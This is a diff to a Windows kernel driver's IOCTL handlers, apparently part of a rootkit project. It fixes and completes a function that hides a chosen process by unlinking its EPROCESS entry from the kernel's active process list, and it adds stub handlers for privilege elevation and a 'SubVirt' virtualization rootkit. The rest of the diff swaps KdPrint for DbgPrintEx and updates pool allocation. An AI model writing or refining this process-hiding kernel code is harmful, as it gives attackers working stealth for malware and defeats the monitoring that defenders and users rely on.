@@ -1,8 +1,10 @@
 #include "ioctl_handles.h"
-#include <Ntstrsafe.h>
 #include "utils.h"
-#include "offsets_n_tokens.h"
+#include "offsets.h"
 #include "sync.h"
+#include<ntstrsafe.h>
+#include <ntstatus.h>
+#include <ntddk.h>
 
 static NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret);
 static NTSTATUS Elevate(ULONG pid);
@@ -17,7 +19,7 @@ NTSTATUS IoctlHandlers::HandleElevate(PIRP pIrp) {
 	NTSTATUS status = STATUS_SUCCESS;
 	ULONG pid;
 
-	KdPrint(("Recieved Elevate IOCTL...\n"));
+	DbgPrintEx(0, 0, "Recieved Elevate IOCTL...\n");
 	//
 	// Retrive PID.
 	//
@@ -46,7 +48,7 @@ NTSTATUS IoctlHandlers::HandleHideProcess(PIRP pIrp) {
 	NTSTATUS status = STATUS_SUCCESS;
 	ULONG pid;
 
-	KdPrint(("Recieved Hide IOCTL...\n"));
+	DbgPrintEx(0, 0, "Recieved Hide IOCTL...\n");
 	//
 	// Retrive PID.
 	//
@@ -57,7 +59,7 @@ NTSTATUS IoctlHandlers::HandleHideProcess(PIRP pIrp) {
 		return 0;
 	}
 
-	KdPrint(("Retrived PID : %d\n", pid));
+	DbgPrintEx(0 , 0,"Retrived PID : %d\n", pid);
 
 	status = Hide(pid);
 
@@ -83,26 +85,26 @@ NTSTATUS IoctlHandlers::HandleTestConnection(PIRP pIrp, ULONG bufferSize) {
 	//
 	// Print output recieved from usermode.
 	//
-	KdPrint(("Input : %s\n", inputbuffer));
+	DbgPrintEx(0, 0, "Input : %s\n", inputbuffer);
 
-	char* outputprefix = "Hello form Kernel! Recieved Input : ";
+	char* outputprefix = "Hello from Kernel! Recieved Input : ";
 
 	//
 	// Check if the input buffersize is too small.
 	//
 	if (bufferSize < (strlen(inputbuffer) + strlen(outputprefix) + 1)) {
 
-		KdPrint(("Output buffer too small...\n"));
+		DbgPrintEx(0, 0, "Output buffer too small...\n");
 		status = STATUS_BUFFER_TOO_SMALL;
 		pIrp->IoStatus.Information = 0;
 	}
 
 	else {
 
-		char* readbuf = reinterpret_cast<char*>(ExAllocatePool(PagedPool, 1024));
+		char* readbuf = reinterpret_cast<char*>(ExAllocatePool2(POOL_FLAG_PAGED, 1024, 1));
 
 		if (!readbuf) {
-			KdPrint(("Buffer allocation failed...\n"));
+			DbgPrintEx(0, 0, "Buffer allocation failed...\n");
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			pIrp->IoStatus.Information = 0;
 			pIrp->IoStatus.Status = status;
@@ -114,7 +116,7 @@ NTSTATUS IoctlHandlers::HandleTestConnection(PIRP pIrp, ULONG bufferSize) {
 		// Concatnate the strings to a new buffer.
 		//
 		RtlStringCbCatA(readbuf, bufferSize, outputprefix);
-		RtlStringCbCatA(readbuf, bufferSize - strlen(outputprefix) - 1, outputbuffer);
+		RtlStringCbCatA(readbuf, bufferSize - strlen(outputprefix) - 1, inputbuffer);
 		//
 		// Copy buffer to original buffer.
 		//
@@ -122,7 +124,7 @@ NTSTATUS IoctlHandlers::HandleTestConnection(PIRP pIrp, ULONG bufferSize) {
 
 		ExFreePool(readbuf);
 
-		KdPrint(("Sending to user :%s\n", outputbuffer));
+		DbgPrintEx(0, 0, "Sending to user :%s\n", outputbuffer);
 		status = STATUS_SUCCESS;
 		pIrp->IoStatus.Information = strlen(outputbuffer) + 1;
 
@@ -135,21 +137,26 @@ NTSTATUS IoctlHandlers::HandleTestConnection(PIRP pIrp, ULONG bufferSize) {
 // Calls subvirt function through IOCTL command.
 // Yet to implement this function.
 //
-static NTSTATUS IoctlHandlers::HandleSubvirt() {
+NTSTATUS IoctlHandlers::HandleSubvirt(PIRP pIrp) {
 
+	NTSTATUS status = STATUS_SUCCESS;
+	UNREFERENCED_PARAMETER(pIrp);
 	KdPrint(("TODO!!!/n"));
 
-	return STATUS_SUCCESS;
+	status = SubVirt();
+
+	return status;
 
 }
 
-static NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret) {
+NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret) {
 
 	PCHAR pidbuf = static_cast<PCHAR>(pIrp->AssociatedIrp.SystemBuffer);
 
 	KdPrint(("Getting PID...\n"));
 
-	NTSTATUS status = RtlCharToInteger(pidbuf, strlen(pidbuf) + 1, ret);
+
+	NTSTATUS status = RtlCharToInteger(pidbuf, 10, ret);
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint(("Sorry! Could not obtain PID from IRP...\n"));
@@ -167,52 +174,57 @@ static NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret) {
 
 }
 
-static NTSTATUS Elevate(ULONG pid) {
+NTSTATUS Elevate(ULONG pid) {
 
+	UNREFERENCED_PARAMETER(pid);
 	KdPrint(("TODO!!\n"));
+	return STATUS_SUCCESS;
 
 }
 
-static NTSTATUS Hide(ULONG pid) {
+NTSTATUS Hide(ULONG pid) {
 
-	DWORD eproc = 0;
+	PEPROCESS eproc;
 	PLIST_ENTRY plist_active_procs;
 	//
 	// Gain thread exclusivity
 	//
+
 	PKDPC pkdpc = Sync::GainAllThreadExclusive();
 	
-	KdPrint(("Finding EPROC struct with PID...\n"));
+	DbgPrintEx(0 , 0, "Finding EPROC struct with PID...\n");
 	eproc = Utilities::FindProcEproc(pid);
 
 	if (!eproc) {
 
-		KdPrint(("! Error while retriving the eproc structure...\n"));
+		DbgPrintEx(0, 0, "! Error while retriving the eproc structure...\n");
 		return STATUS_INVALID_PARAMETER;
 	}
 	
-	plist_active_procs = (LIST_ENTRY*)(eproc + FLINK_OFFSET);
+	plist_active_procs = (PLIST_ENTRY)((PUCHAR)eproc + FLINK_OFFSET);
 
-	// Blink to the reaward process         // change reawards process to point to target process Flink(forward process)
-   	*((DWORD*)plist_active_procs->Blink) = (DWORD)plist_active_procs->Flink;
+	if (!plist_active_procs) {
+		DbgPrintEx(0, 0, "Error: Invalid plist_active_procs pointer.\n");
+		Sync::ReleaseAllThreadExclusive(pkdpc);
+		return STATUS_INVALID_PARAMETER;
+	}
 
-	// Flink to the forward process's Blink(by adding 4 bytes to the PLIST_ENTRY Structure)         // change it to point to the reaward pointer of our target process 
-	*((DWORD*)plist_active_procs->Flink + 1) = (DWORD)plist_active_procs->Blink;
+	PLIST_ENTRY flink = plist_active_procs->Flink;
+	PLIST_ENTRY blink = plist_active_procs->Blink;
 
-	// Proevents Random BSODS
-	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
-	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Blink);
-	//
-	// Release all thread exclusivity safely
-	//
+	blink->Flink = flink;
+	flink->Blink = blink;
+
+	plist_active_procs->Flink = plist_active_procs;
+	plist_active_procs->Blink = plist_active_procs;	
 
 	Sync::ReleaseAllThreadExclusive(pkdpc);
 
-	KdPrint(("Sucessfully Hid process...\n"));
+	DbgPrintEx(0, 0, "Sucessfully Hid process...\n");
+	return STATUS_SUCCESS;
 
 }
-static NTSTATUS SubVirt() {
-
-	KdPrint(("TODO!!\n"));
-
+NTSTATUS SubVirt() {
+    KdPrint(("TODO!!\n"));
+    return STATUS_SUCCESS;
 }
